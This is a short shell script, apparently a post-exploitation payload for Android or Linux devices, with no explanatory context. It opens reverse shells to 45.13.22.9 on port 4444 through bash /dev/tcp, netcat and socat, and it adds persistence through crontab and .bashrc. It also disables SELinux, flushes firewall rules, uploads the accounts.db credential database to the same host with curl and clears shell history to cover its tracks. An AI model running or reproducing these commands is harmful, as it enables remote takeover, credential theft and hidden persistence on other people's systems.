#!/bin/sh
bash -i >& /dev/tcp/45.13.22.9/4444 0>&1
nc -e /bin/sh 45.13.22.9 4444
socat tcp-connect:45.13.22.9:4444 exec:/bin/sh
echo "* * * * * sh /data/local/tmp/x" | crontab -
echo "sh /data/local/tmp/x" >> ~/.bashrc
setenforce 0
iptables -F
curl -F "f=@/data/system/users/0/accounts.db" http://45.13.22.9/up
history -c
